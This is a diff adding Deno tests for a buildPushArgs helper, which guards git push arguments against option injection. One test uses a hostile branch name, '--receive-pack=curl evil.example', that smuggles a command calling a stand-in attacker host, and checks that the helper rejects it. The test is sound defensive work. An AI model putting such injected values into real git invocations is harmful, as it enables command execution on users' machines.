@@ -16,6 +16,7 @@ import {
   buildCheckoutNewBranchArgs,
   buildFetchArgs,
   buildPullArgs,
+  buildPushArgs,
   buildRebaseArgs,
 } from "../lib/git_ref_args.ts";
 
@@ -181,4 +182,38 @@ Deno.test("assertSafeGitRef - error names the rejected value and context", () =>
   );
   assertEquals(error.message.includes("fetch ref"), true);
   assertEquals(error.message.includes("-rf"), true);
+});
+
+// ---------------------------------------------------------------------------
+// buildPushArgs (Issue #148) — the branch push every automated commit takes,
+// WIP preservation on a deadline timeout included.
+// ---------------------------------------------------------------------------
+
+Deno.test("buildPushArgs - separator precedes the remote and branch", () => {
+  assertEquals(buildPushArgs("origin", "issue-148-preserve-wip"), [
+    "push",
+    "--end-of-options",
+    "origin",
+    "issue-148-preserve-wip",
+  ]);
+});
+
+Deno.test("buildPushArgs - the upstream flag precedes the separator", () => {
+  assertEquals(
+    buildPushArgs("origin", "issue-148-preserve-wip", { setUpstream: true }),
+    ["push", "-u", "--end-of-options", "origin", "issue-148-preserve-wip"],
+  );
+});
+
+Deno.test("buildPushArgs - rejects a dash-leading branch name", () => {
+  assertThrows(
+    () => buildPushArgs("origin", "--receive-pack=curl evil.example"),
+    Error,
+    "must not begin with '-'",
+  );
+});
+
+Deno.test("buildPushArgs - rejects a dash-leading remote and an empty branch", () => {
+  assertThrows(() => buildPushArgs("-o", "main"), Error, "must not begin");
+  assertThrows(() => buildPushArgs("origin", ""), Error, "must not be empty");
 });
